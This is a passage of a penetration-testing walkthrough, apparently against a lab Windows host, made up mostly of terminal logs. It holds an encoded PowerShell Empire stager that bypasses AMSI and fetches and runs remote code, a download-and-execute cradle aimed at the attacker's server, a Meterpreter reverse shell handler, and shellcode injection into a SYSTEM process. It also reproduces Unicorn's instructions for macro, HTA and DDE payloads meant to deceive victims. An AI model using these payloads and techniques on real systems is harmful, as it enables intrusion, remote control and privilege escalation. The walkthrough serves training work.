AEUAewBbAFMAQwBSAEkAUABUAEIAbABvAEMASwBdAC4AIgBHAGUAdABGAGkARQBgAEwARAAiACgAJwBzAGkAZwBuAGEAdAB1AHIAZQBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBlAFQAVgBBAEwAVQBlACgAJABuAFUATABMACwAKABOAGUAVwAtAE8AQgBqAGUAQwBUACAAQwBvAEwAbABFAGMAdABJAE8ATgBTAC4ARwBFAG4AZQBSAGkAYwAuAEgAQQBTAGgAUwBFAHQAWwBzAFQAUgBpAG4ARwBdACkAKQB9AFsAUgBFAEYAXQAuAEEAcwBzAEUAbQBiAGwAeQAuAEcARQBUAFQAeQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAfAA/AHsAJABfAH0AfAAlAHsAJABfAC4ARwBlAHQARgBpAEUAbABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdABWAEEATABVAGUAKAAkAE4AVQBsAGwALAAkAHQAUgBVAGUAKQB9ADsAfQA7AFsAUwBZAFMAdABlAG0ALgBOAEUAVAAuAFMARQBSAFYASQBDAGUAUABPAGkAbgB0AE0AYQBuAEEARwBFAHIAXQA6ADoARQBYAFAARQBDAHQAMQAwADAAQwBPAE4AdABpAE4AdQBFAD0AMAA7ACQAVwBjAD0ATgBlAHcALQBPAEIAagBFAGMAVAAgAFMAeQBzAHQAZQBtAC4ATgBFAFQALgBXAGUAQgBDAGwASQBFAG4AdAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHcAYwAuAEgARQBhAGQARQByAHMALgBBAEQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAFcAQwAuAFAAUgBPAHgAWQA9AFsAUwBZAFMAdABlAE0ALgBOAEUAVAAuAFcAZQBCAFIARQBxAHUAZQBTAHQAXQA6ADoARABlAEYAQQB1AGwAVABXAGUAQgBQAHIATwBYAHkAOwAkAHcAYwAuAFAAcgBvAFgAeQAuAEMAcgBFAEQARQBuAHQAaQBBAGwAcwAgAD0AIABbAFMAWQBzAFQAZQBNAC4ATgBlAHQALgBDAFIAZQBkAEUAbgBUAGkAQQBMAEMAYQBDAGgARQBdADoAOgBEAGUARgBhAFUATABUAE4ARQB0AFcATwBSAEsAQwByAGUAZABlAG4AdABJAGEATABzADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAHcAYwAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwB5AFMAdABFAG0ALgBUAGUAeABUAC4ARQBuAGMAbwBEAGkAbgBHAF0AOgA6AEEAUwBDAEkASQAuAEcAZQBUAEIAeQB0AEUAcwAoACcATAB5ACoATwBCACsAfgBLAGUAXQBZAGQAQwAmAEgARABuAEUAJQBjACkAOQBfADEAcwAyAFAAPQA8AHcAcABvACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAHIARwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBPAHUATgBUAF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAEIAWABvAFIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAcwBlAHIAPQAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMgAzADQAOgA0ADQAMwAnADsAJAB0AD0AJwAvAGEAZABtAGkAbgAvAGcAZQB0AC4AcABoAHAAJwA7ACQAdwBjAC4ASABFAEEAZABlAFIAUwAuAEEARABkACgAIgBDAG8AbwBrAGkAZQAiACwAIgBzAGUAcwBzAGkAbwBuAD0AegA2AFcATwA1AG8AWABwAFMARQB5AGYARwBIAG4AdgBHAEgAMgBJAHIAVgB5AGcAMABCADQAPQAiACkAOwAkAGQAQQB0AEEAPQAkAFcAQwAuAEQAbwB3AG4ATABvAGEARABEAGEAdABhACgAJABTAEUAcgArACQAdAApADsAJABpAHYAPQAkAEQAYQBUAEEAWwAwAC4ALgAzAF0AOwAkAGQAQQBUAEEAPQAkAGQAYQB0AEEAWwA0AC4ALgAkAGQAQQB0AGEALgBMAEUAbgBnAHQAaABdADsALQBqAE8ASQBuAFsAQwBoAGEAUgBbAF0AXQAoACYAIAAkAFIAIAAkAGQAQQBUAGEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==
root@kali:~/Desktop#
root@kali:~/Desktop# python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
10.10.10.40 - - [19/Jan/2018 15:30:10] "GET /empire.ps1 HTTP/1.1" 200 -
```

```sh
meterpreter > shell
Process 224 created.
Channel 2 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.234:8000/empire.ps1')"
powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.234:8000/empire.ps1')"
```

###### Use Empire agent to enumerate further

```sh
(Empire: listeners) > [+] Initial agent 5H87SFPE from 10.10.10.40 now active (Slack)

(Empire: listeners) > back
================================================================
 [Empire]  Post-Exploitation Framework
================================================================
 [Version] 2.4 | [Web] https://github.com/empireProject/Empire
================================================================

   _______ .___  ___. .______    __  .______       _______
  |   ____||   \/   | |   _  \  |  | |   _  \     |   ____|
  |  |__   |  \  /  | |  |_)  | |  | |  |_)  |    |  |__
  |   __|  |  |\/|  | |   ___/  |  | |      /     |   __|
  |  |____ |  |  |  | |  |      |  | |  |\  \----.|  |____
  |_______||__|  |__| | _|      |__| | _| `._____||_______|


       283 modules currently loaded

       1 listeners currently active

       1 agents currently active


(Empire) > agents

[*] Active agents:

  Name            Lang  Internal IP     Machine Name    Username            Process             Delay    Last Seen
  ---------       ----  -----------     ------------    ---------           -------             -----    --------------------
  5H87SFPE        ps    10.10.10.40     HARIS-PC        *WORKGROUP\SYSTEM   powershell/2952     5/0.0    2018-01-19 17:25:25

(Empire: agents) > sleep all 1
(Empire: agents) > list

[*] Active agents:

  Name            Lang  Internal IP     Machine Name    Username            Process             Delay    Last Seen
  ---------       ----  -----------     ------------    ---------           -------             -----    --------------------
  5H87SFPE        ps    10.10.10.40     HARIS-PC        *WORKGROUP\SYSTEM   powershell/2952     1/0.0    2018-01-19 17:25:44

(Empire: agents) > interact 5H87SFPE

agent interval set to 1 seconds with a jitter of 0

executed Set-Delay 1 0.0
(Empire: 5H87SFPE) > usemodule privesc/powerup/allchecks
(Empire: powershell/privesc/powerup/allchecks) > info

              Name: Invoke-AllChecks
            Module: powershell/privesc/powerup/allchecks
        NeedsAdmin: False
         OpsecSafe: True
          Language: powershell
MinLanguageVersion: 2
        Background: True
   OutputExtension: None

Authors:
  @harmj0y

Description:
  Runs all current checks for Windows privesc vectors.

Comments:
  https://github.com/PowerShellEmpire/PowerTools/tree/master/P
  owerUp

Options:

  Name  Required    Value                     Description
  ----  --------    -------                   -----------
  Agent True        5H87SFPE                  Agent to run module on.

(Empire: powershell/privesc/powerup/allchecks) >
(Empire: powershell/privesc/powerup/allchecks) > execute
(Empire: powershell/privesc/powerup/allchecks) > back
Job started: T5ZXR6
(Empire: 5H87SFPE) > jobs
(Empire: 5H87SFPE) >
Running Jobs:
T5ZXR6

<---snip--->

TaskName     : ConfigNotification
TaskFilePath : @{Permissions=GenericAll; ModifiablePath=C:\; IdentityReference=N
               T AUTHORITY\SYSTEM}
TaskTrigger  : <Triggers xmlns="http://schemas.microsoft.com/windows/2004/02/mit
               /task"><CalendarTrigger><StartBoundary>2010-11-28T10:00:00</Start
               Boundary><Enabled>true</Enabled><ScheduleByDay><DaysInterval>1</D
               aysInterval></ScheduleByDay></CalendarTrigger></Triggers>

TaskName     : ConfigNotification
TaskFilePath : @{Permissions=GenericAll; ModifiablePath=C:\; IdentityReference=B
               UILTIN\Administrators}
TaskTrigger  : <Triggers xmlns="http://schemas.microsoft.com/windows/2004/02/mit
               /task"><CalendarTrigger><StartBoundary>2010-11-28T10:00:00</Start
               Boundary><Enabled>true</Enabled><ScheduleByDay><DaysInterval>1</D
               aysInterval></ScheduleByDay></CalendarTrigger></Triggers>

TaskName     : ConfigNotification
TaskFilePath : @{Permissions=System.Object[]; ModifiablePath=C:\; IdentityRefere
               nce=BUILTIN\Administrators}
TaskTrigger  : <Triggers xmlns="http://schemas.microsoft.com/windows/2004/02/mit
               /task"><CalendarTrigger><StartBoundary>2010-11-28T10:00:00</Start
               Boundary><Enabled>true</Enabled><ScheduleByDay><DaysInterval>1</D
               aysInterval></ScheduleByDay></CalendarTrigger></Triggers>





[*] Checking for unattended install files...


[*] Checking for encrypted web.config strings...


[*] Checking for encrypted application pool and virtual directory passwords...


[*] Checking for plaintext passwords in McAfee SiteList.xml files....




[*] Checking for cached Group Policy Preferences .xml files....





Invoke-AllChecks completed!


(Empire: powershell/privesc/powerup/allchecks) >
```

###### Load external powershell scripts (Sherlock) into Empire and run it

```sh
root@kali:~/Desktop# git clone https://github.com/rasta-mouse/Sherlock.git
Cloning into 'Sherlock'...
remote: Counting objects: 63, done.
remote: Total 63 (delta 0), reused 0 (delta 0), pack-reused 63
Unpacking objects: 100% (63/63), done.
root@kali:~/Desktop# cd Sherlock/
root@kali:~/Desktop/Sherlock# ls -la
total 68
drwxr-xr-x 3 root root  4096 Jan 19 13:20 .
drwxr-xr-x 3 root root  4096 Jan 19 13:20 ..
drwxr-xr-x 8 root root  4096 Jan 19 13:20 .git
-rw-r--r-- 1 root root 35141 Jan 19 13:20 LICENSE
-rw-r--r-- 1 root root  2369 Jan 19 13:20 README.md
-rw-r--r-- 1 root root 15021 Jan 19 13:20 Sherlock.ps1
root@kali:~/Desktop/Sherlock#
```

```sh
(Empire: 5H87SFPE) > scriptimport /root/Desktop/Sherlock/Sherlock.ps1
(Empire: 5H87SFPE) >
script successfully saved in memory

(Empire: 5H87SFPE) > scriptcmd Find-AllVulns
(Empire: 5H87SFPE) >
Job started: KTGCD8



Title      : User Mode to Ring (KiTrap0D)
MSBulletin : MS10-015
CVEID      : 2010-0232
Link       : https://www.exploit-db.com/exploits/11199/
VulnStatus : Not supported on 64-bit systems

Title      : Task Scheduler .XML
MSBulletin : MS10-092
CVEID      : 2010-3338, 2010-3888
Link       : https://www.exploit-db.com/exploits/19930/
VulnStatus : Not Vulnerable

Title      : NTUserMessageCall Win32k Kernel Pool Overflow
MSBulletin : MS13-053
CVEID      : 2013-1300
Link       : https://www.exploit-db.com/exploits/33213/
VulnStatus : Not supported on 64-bit systems

Title      : TrackPopupMenuEx Win32k NULL Page
MSBulletin : MS13-081
CVEID      : 2013-3881
Link       : https://www.exploit-db.com/exploits/31576/
VulnStatus : Not supported on 64-bit systems

Title      : TrackPopupMenu Win32k Null Pointer Dereference
MSBulletin : MS14-058
CVEID      : 2014-4113
Link       : https://www.exploit-db.com/exploits/35101/
VulnStatus : Appears Vulnerable

Title      : ClientCopyImage Win32k
MSBulletin : MS15-051
CVEID      : 2015-1701, 2015-2433
Link       : https://www.exploit-db.com/exploits/37367/
VulnStatus : Appears Vulnerable

Title      : Font Driver Buffer Overflow
MSBulletin : MS15-078
CVEID      : 2015-2426, 2015-2433
Link       : https://www.exploit-db.com/exploits/38222/
VulnStatus : Not Vulnerable

Title      : 'mrxdav.sys' WebDAV
MSBulletin : MS16-016
CVEID      : 2016-0051
Link       : https://www.exploit-db.com/exploits/40085/
VulnStatus : Not supported on 64-bit systems

Title      : Secondary Logon Handle
MSBulletin : MS16-032
CVEID      : 2016-0099
Link       : https://www.exploit-db.com/exploits/39719/
VulnStatus : Not Vulnerable

Title      : Win32k Elevation of Privilege
MSBulletin : MS16-135
CVEID      : 2016-7255
Link       : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/S
             ample-Exploits/MS16-135
VulnStatus : Appears Vulnerable

Title      : Nessus Agent 6.6.2 - 6.10.3
MSBulletin : N/A
CVEID      : 2017-7199
Link       : https://aspe1337.blogspot.co.uk/2017/04/writeup-of-cve-2017-7199.h
             tml
VulnStatus : Not Vulnerable


(Empire: 5H87SFPE) >
```

###### Use meterpreter listener

```sh
================================================================
 [Empire]  Post-Exploitation Framework
================================================================
 [Version] 2.4 | [Web] https://github.com/empireProject/Empire
================================================================

   _______ .___  ___. .______    __  .______       _______
  |   ____||   \/   | |   _  \  |  | |   _  \     |   ____|
  |  |__   |  \  /  | |  |_)  | |  | |  |_)  |    |  |__
  |   __|  |  |\/|  | |   ___/  |  | |      /     |   __|
  |  |____ |  |  |  | |  |      |  | |  |\  \----.|  |____
  |_______||__|  |__| | _|      |__| | _| `._____||_______|


       283 modules currently loaded

       1 listeners currently active

       1 agents currently active


(Empire) > listeners

[*] Active listeners:

  Name              Module          Host                                 Delay/Jitter   KillDate
  ----              ------          ----                                 ------------   --------
  http              http            http://10.10.14.234:443              5/0.0

(Empire: listeners) > uselistener meterpreter
(Empire: listeners/meterpreter) > set Host http://10.10.14.234:8001
(Empire: listeners/meterpreter) > set Port 8001
(Empire: listeners/meterpreter) > info

    Name: Meterpreter
Category: client_server

Authors:
  @harmj0y

Description:
  Starts a 'foreign' http[s] Meterpreter listener.

Meterpreter Options:

  Name              Required    Value                            Description
  ----              --------    -------                          -----------
  Host              True        http://10.10.14.234:8001         Hostname/IP for staging.
  Name              True        meterpreter1                     Name for the listener.
  Port              True        8001                             Port for the listener.


(Empire: listeners/meterpreter) > execute
[*] Starting listener 'meterpreter1'
[+] Listener successfully started!
(Empire: listeners/meterpreter) > back
(Empire: listeners) >
```

```sh
msf > use exploit/multi/handler
msf exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_http
PAYLOAD => windows/meterpreter/reverse_http
msf exploit(multi/handler) > set LHOST 10.10.14.234
LHOST => 10.10.14.234
msf exploit(multi/handler) > set LPORT 8001
LPORT => 8001
msf exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_http):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.234     yes       The local listener hostname
   LPORT     8001             yes       The local listener port
   LURI                       no        The HTTP Path


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf exploit(multi/handler) > exploit -j
[*] Exploit running as background job 0.

[*] Started HTTP reverse handler on http://10.10.14.234:8001
msf exploit(multi/handler) >
```

```sh
(Empire) > interact 5H87SFPE
(Empire: 5H87SFPE) > ps
(Empire: 5H87SFPE) >
ProcessName                 PID Arch            UserName        MemUsage
-----------                 --- ----            --------        --------
Idle                          0 x64             N/A             0.02 MB
System                        4 x64             NT AUTHORITY\SY 1.14 MB
                                                STEM
powershell                  220 x64             NT AUTHORITY\SY 48.55 MB
                                                STEM
smss                        288 x64             NT AUTHORITY\SY 0.87 MB
                                                STEM
svchost                     344 x64             NT AUTHORITY\NE 22.09 MB
                                                TWORK SERVICE
conhost                     364 x64             NT AUTHORITY\SY 3.14 MB
                                                STEM
csrss                       372 x64             NT AUTHORITY\SY 4.21 MB
                                                STEM
wininit                     424 x64             NT AUTHORITY\SY 3.80 MB
                                                STEM
csrss                       436 x64             NT AUTHORITY\SY 2.69 MB
                                                STEM
winlogon                    468 x64             NT AUTHORITY\SY 5.02 MB
                                                STEM
services                    524 x64             NT AUTHORITY\SY 7.20 MB
                                                STEM
lsass                       540 x64             NT AUTHORITY\SY 9.56 MB
                                                STEM
lsm                         548 x64             NT AUTHORITY\SY 3.15 MB
                                                STEM
svchost                     644 x64             NT AUTHORITY\SY 8.12 MB
                                                STEM
svchost                     724 x64             NT AUTHORITY\NE 6.74 MB
                                                TWORK SERVICE
LogonUI                     816 x64             NT AUTHORITY\SY 19.78 MB
                                                STEM
svchost                     824 x64             NT AUTHORITY\LO 12.89 MB
                                                CAL SERVICE
svchost                     864 x64             NT AUTHORITY\SY 61.96 MB
                                                STEM
svchost                     904 x64             NT AUTHORITY\LO 10.41 MB
                                                CAL SERVICE
svchost                     928 x64             NT AUTHORITY\SY 32.09 MB
                                                STEM
spoolsv                    1056 x64             NT AUTHORITY\SY 11.36 MB
                                                STEM
svchost                    1096 x64             NT AUTHORITY\LO 8.96 MB
                                                CAL SERVICE
msdtc                      1172 x64             NT AUTHORITY\NE 5.51 MB
                                                TWORK SERVICE
svchost                    1204 x64             NT AUTHORITY\SY 7.11 MB
                                                STEM
cmd                        1240 x64             NT AUTHORITY\SY 3.01 MB
                                                STEM
msiexec                    1276 x64             NT AUTHORITY\SY 6.57 MB
                                                STEM
VGAuthService              1308 x64             NT AUTHORITY\SY 4.89 MB
                                                STEM
vmtoolsd                   1392 x64             NT AUTHORITY\SY 13.81 MB
                                                STEM
ManagementAgent            1424 x64             NT AUTHORITY\SY 5.71 MB
Host                                            STEM
powershell                 1672 x64             NT AUTHORITY\SY 45.59 MB
                                                STEM
svchost                    1772 x64             NT AUTHORITY\NE 4.63 MB
                                                TWORK SERVICE
cmd                        1812 x64             NT AUTHORITY\SY 3.19 MB
                                                STEM
powershell                 1840 x64             NT AUTHORITY\SY 75.71 MB
                                                STEM
conhost                    1964 x64             NT AUTHORITY\SY 3.15 MB
                                                STEM
WmiPrvSE                   2008 x64             N/A             16.21 MB
powershell                 2220 x64             NT AUTHORITY\SY 45.64 MB
                                                STEM
cmd                        2316 x64             NT AUTHORITY\SY 3.05 MB
                                                STEM
conhost                    2424 x64             NT AUTHORITY\SY 3.08 MB
                                                STEM
conhost                    2476 x64             NT AUTHORITY\SY 2.91 MB
                                                STEM
powershell                 2532 x86             NT AUTHORITY\SY 37.19 MB
                                                STEM
powershell                 2544 x64             NT AUTHORITY\SY 48.79 MB
                                                STEM
powershell                 2564 x86             NT AUTHORITY\SY 40.80 MB
                                                STEM
powershell                 2604 x64             NT AUTHORITY\SY 45.63 MB
                                                STEM
cmd                        2620 x64             NT AUTHORITY\SY 3.03 MB
                                                STEM
svchost                    2772 x64             NT AUTHORITY\SY 53.14 MB
                                                STEM
SearchIndexer              2872 x64             NT AUTHORITY\SY 12.57 MB
                                                STEM
powershell                 2952 x64             NT AUTHORITY\SY 117.93 MB
                                                STEM
conhost                    2960 x64             NT AUTHORITY\SY 3.12 MB
                                                STEM

(Empire: 5H87SFPE) >
(Empire: 5H87SFPE) > injectshellcode meterpreter1 1840
(Empire: powershell/code_execution/invoke_shellcode) > info

              Name: Invoke-Shellcode
            Module: powershell/code_execution/invoke_shellcode
        NeedsAdmin: False
         OpsecSafe: True
          Language: powershell
MinLanguageVersion: 2
        Background: True
   OutputExtension: None

Authors:
  @mattifestation

Description:
  Uses PowerSploit's Invoke--Shellcode to inject shellcode
  into the process ID of your choosing or within the context
  of the running PowerShell process. If you're injecting
  custom shellcode, make sure it's in the correct format and
  matches the architecture of the process you're injecting
  into.

Comments:
  http://www.exploit-monday.com https://github.com/mattifestat
  ion/PowerSploit/blob/master/CodeExecution/Invoke-
  Shellcode.ps1

Options:

  Name      Required    Value                     Description
  ----      --------    -------                   -----------
  ProcessID False       1840                      Process ID of the process you want to
                                                  inject shellcode into.
  Lhost     False       10.10.14.234              Local host handler for the meterpreter
                                                  shell.
  Agent     True        5H87SFPE                  Agent to run module on.
  Listener  False       meterpreter1              Meterpreter/Beacon listener name.
  Lport     False       8001                      Local port of the host handler.
  Shellcode False                                 Custom shellcode to inject,
                                                  0xaa,0xab,... format.
  Payload   False       reverse_http              Metasploit payload to inject
                                                  (reverse_http[s]).

(Empire: powershell/code_execution/invoke_shellcode) >
(Empire: powershell/code_execution/invoke_shellcode) > execute
Job started: UN2W63

Shellcode injected.


(Empire: powershell/code_execution/invoke_shellcode) >
```

```sh
msf exploit(multi/handler) > exploit -j
[*] Exploit running as background job 2.

[*] Started HTTP reverse handler on http://10.10.14.234:8001
msf exploit(multi/handler) > [*] http://10.10.14.234:8001 handling request from 10.10.10.40; (UUID: 6cg4eop4) Staging x86 payload (180825 bytes) ...
[*] Meterpreter session 2 opened (10.10.14.234:8001 -> 10.10.10.40:50996) at 2018-01-19 17:55:25 -0500

msf exploit(multi/handler) > sessions -i

Active sessions
===============

  Id  Name  Type                     Information  Connection
  --  ----  ----                     -----------  ----------
  1         meterpreter x86/windows               10.10.14.234:8001 -> 10.10.10.40:50107 (10.10.10.40)
  2         meterpreter x86/windows               10.10.14.234:8001 -> 10.10.10.40:50996 (10.10.10.40)

msf exploit(multi/handler) > sessions -i 2
[*] Starting interaction with 2...

meterpreter > help

Core Commands
=============

    Command                   Description
    -------                   -----------
    ?                         Help menu
    background                Backgrounds the current session
    bgkill                    Kills a background meterpreter script
    bglist                    Lists running background scripts
    bgrun                     Executes a meterpreter script as a background thread
    channel                   Displays information or control active channels
    close                     Closes a channel
    detach                    Detach the meterpreter session (for http/https)
    disable_unicode_encoding  Disables encoding of unicode strings
    enable_unicode_encoding   Enables encoding of unicode strings
    exit                      Terminate the meterpreter session
    get_timeouts              Get the current session timeout values
    guid                      Get the session GUID
    help                      Help menu
    info                      Displays information about a Post module
    irb                       Drop into irb scripting mode
    load                      Load one or more meterpreter extensions
    machine_id                Get the MSF ID of the machine attached to the session
    migrate                   Migrate the server to another process
    pivot                     Manage pivot listeners
    quit                      Terminate the meterpreter session
    read                      Reads data from a channel
    resource                  Run the commands stored in a file
    run                       Executes a meterpreter script or Post module
    sessions                  Quickly switch to another session
    set_timeouts              Set the current session timeout values
    sleep                     Force Meterpreter to go quiet, then re-establish session.
    transport                 Change the current transport mechanism
    use                       Deprecated alias for "load"
    uuid                      Get the UUID for the current session
    write                     Writes data to a channel

meterpreter >
```

###### Unicorn - injectshellcode only works on 32 bit process

```sh
root@kali:~/Desktop# git clone https://github.com/trustedsec/unicorn.git
Cloning into 'unicorn'...
remote: Counting objects: 294, done.
remote: Compressing objects: 100% (5/5), done.
remote: Total 294 (delta 2), reused 6 (delta 2), pack-reused 287
Receiving objects: 100% (294/294), 159.79 KiB | 365.00 KiB/s, done.
Resolving deltas: 100% (182/182), done.
root@kali:~/Desktop# cd unicorn/
root@kali:~/Desktop/unicorn# ls
CHANGELOG.txt  CREDITS.txt  LICENSE.txt  README.md  unicorn.py
root@kali:~/Desktop/unicorn# ./unicorn.py --help

[********************************************************************************************************]

				-----POWERSHELL ATTACK INSTRUCTIONS----

Everything is now generated in two files, powershell_attack.txt and unicorn.rc. The text file contains  all of the code needed in order to inject the powershell attack into memory. Note you will need a place that supports remote command injection of some sort. Often times this could be through an excel/word  doc or through psexec_commands inside of Metasploit, SQLi, etc.. There are so many implications and  scenarios to where you can use this attack at. Simply paste the powershell_attack.txt command in any command prompt window or where you have the ability to call the powershell executable and it will give a shell back to you. This attack also supports windows/download_exec for a payload method instead of just Meterpreter payloads. When using the download and exec, simply put python unicorn.py windows/download_exec url=https://www.thisisnotarealsite.com/payload.exe and the powershell code will download the payload and execute.

Note that you will need to have a listener enabled in order to capture the attack.

[*******************************************************************************************************]


[*******************************************************************************************************]

				-----MACRO ATTACK INSTRUCTIONS----

For the macro attack, you will need to go to File, Properties, Ribbons, and select Developer. Once you do
that, you will have a developer tab. Create a new macro, call it Auto_Open and paste the generated code
into that. This will automatically run. Note that a message will prompt to the user saying that the file
is corrupt and automatically close the excel document. THIS IS NORMAL BEHAVIOR! This is  tricking the
victim to thinking the excel document is corrupted. You should get a shell through powershell injection
after that.

If you are deploying this against Office365/2016+ versions of Word you need to modify the first line of
the output from: Sub Auto_Open()

To: Sub AutoOpen()

The name of the macro itself must also be "AutoOpen" instead of the legacy "Auto_Open" naming scheme.

NOTE: WHEN COPYING AND PASTING THE EXCEL, IF THERE ARE ADDITIONAL SPACES THAT ARE ADDED YOU NEED TO
REMOVE THESE AFTER EACH OF THE POWERSHELL CODE SECTIONS UNDER VARIABLE "x" OR A SYNTAX ERROR WILL
HAPPEN!

[*******************************************************************************************************]



[*******************************************************************************************************]

				-----HTA ATTACK INSTRUCTIONS----

The HTA attack will automatically generate two files, the first the index.html which tells the browser to
use Launcher.hta which contains the malicious powershell injection code. All files are exported to the
hta_access/ folder and there will be three main files. The first is index.html, second Launcher.hta and the
last, the unicorn.rc file. You can run msfconsole -r unicorn.rc to launch the listener for  Metasploit.

A user must click allow and accept when using the HTA attack in order for the powershell injection to work
properly.

[*******************************************************************************************************]



[*******************************************************************************************************]

				-----CERTUTIL Attack Instruction----

The certutil attack vector was identified by Matthew Graeber (@mattifestation) which allows you to take
a binary file, move it into a base64 format and use certutil on the victim machine to convert it back to
a binary for you. This should work on virtually any system and allow you to transfer a binary to the victim
machine through a fake certificate file. To use this attack, simply place an executable in the path of
unicorn and run python unicorn.py <exe_name> crt in order to get the base64 output. Once that's finished,
go to decode_attack/ folder which contains the files. The bat file is a command that can be run in a
windows machine to convert it back to a binary.

[*******************************************************************************************************]


[*******************************************************************************************************]

				-----Custom PS1 Attack Instructions----

This attack method allows you to convert any PowerShell file (.ps1) into an encoded command or macro.

Note if choosing the macro option, a large ps1 file may exceed the amount of carriage returns allowed by
VBA. You may change the number of characters in each VBA string by passing an integer as a parameter.

Examples:

python unicorn.py harmless.ps1
python unicorn.py myfile.ps1 macro
python unicorn.py muahahaha.ps1 macro 500

The last one will use a 500 character string instead of the default 380, resulting in less carriage returns in VBA.

[*******************************************************************************************************]



[*******************************************************************************************************]

                -----DDE Office COM Attack Instructions----

This attack vector will generate the DDEAUTO formulate to place into Word or Excel. The COM object
DDEInitilize and DDEExecute allow for formulas to be created directly within Office which causes the
ability to gain remote code execution without the need of macros. This attack was documented and full
instructions can be found at:

https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/

In order to use this attack, run the following examples:

python unicorn.py <payload> <lhost> <lport> dde
python unicorn.py windows/meterpreter/reverse_https 192.168.5.5 443 dde

Once generated, a powershell_attack.txt will be generated which contains the Office code, and the
unicorn.rc file which is the listener component which can be called by msfconsole -r unicorn.rc to
handle the listener for the payload. In addition a download.ps1 will be exported as well (explained
in the latter section).

In order to apply the payload, as an example (from sensepost article):

1. Open Word
2. Insert tab -> Quick Parts -> Field
3. Choose = (Formula) and click ok.
4. Once the field is inserted, you should now see "!Unexpected End of Formula"
5. Right-click the Field, choose "Toggle Field Codes"
6. Paste in the code from Unicorn
7. Save the Word document.

Once the office document is opened, you should receive a shell through powershell injection. Note
that DDE is limited on char size and we need to use Invoke-Expression (IEX) as the method to download.

The DDE attack will attempt to download download.ps1 which is our powershell injection attack since
we are limited to size restrictions. You will need to move the download.ps1 to a location that is
accessible by the victim machine. This means that you need to host the download.ps1 in an Apache2
directory that it has access to.

You may notice that some of the commands use "{ QUOTE" these are ways of masking specific commands
which is documented here: http://staaldraad.github.io/2017/10/23/msword-field-codes/. In this case
we are changing WindowsPowerShell, powershell.exe, and IEX to avoid detection. Also check out the URL
as it has some great methods for not calling DDE at all.

[*******************************************************************************************************]

-------------------- Magic Unicorn Attack Vector v2.11 -----------------------------

Native x86 powershell injection attacks on any Windows platform.
Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)
Twitter: @TrustedSec, @HackingDave
Credits: Matthew Graeber, Justin Elze, Chris Gates

Happy Magic Unicorns.

Usage: python unicorn.py payload reverse_ipaddr port <optional hta or macro, crt>
PS Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443
PS Down/Exec: python unicorn.py windows/download_exec url=http://badurl.com/payload.exe
Macro Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 macro
HTA Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 hta
DDE Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 dde
CRT Example: python unicorn.py <path_to_payload/exe_encode> crt
Custom PS1 Example: python unicorn.py <path to ps1 file>
Custom PS1 Example: python unicorn.py <path to ps1 file> macro 500
Help Menu: python unicorn.py --help

root@kali:~/Desktop/unicorn#
```

```sh
root@kali:~/Desktop/unicorn# python unicorn.py windows/meterpreter/reverse_http 10.10.14.234 8002
[*] Generating the payload shellcode.. This could take a few seconds/minutes as we create the shellcode...

                                                         ,/
                                                        //
                                                      ,//
                                          ___   /|   |//
                                      `__/\_ --(/|___/-/
                                   \|\_-\___ __-_`- /-/ \.
                                  |\_-___,-\_____--/_)' ) \
                                   \ -_ /     __ \( `( __`\|
                                   `\__|      |\)\ ) /(/|
           ,._____.,            ',--//-|      \  |  '   /
          /     __. \,          / /,---|       \       /
         / /    _. \  \        `/`_/ _,'        |     |
        |  | ( (  \   |      ,/\'__/'/          |     |
        |  \  \`--, `_/_------______/           \(   )/
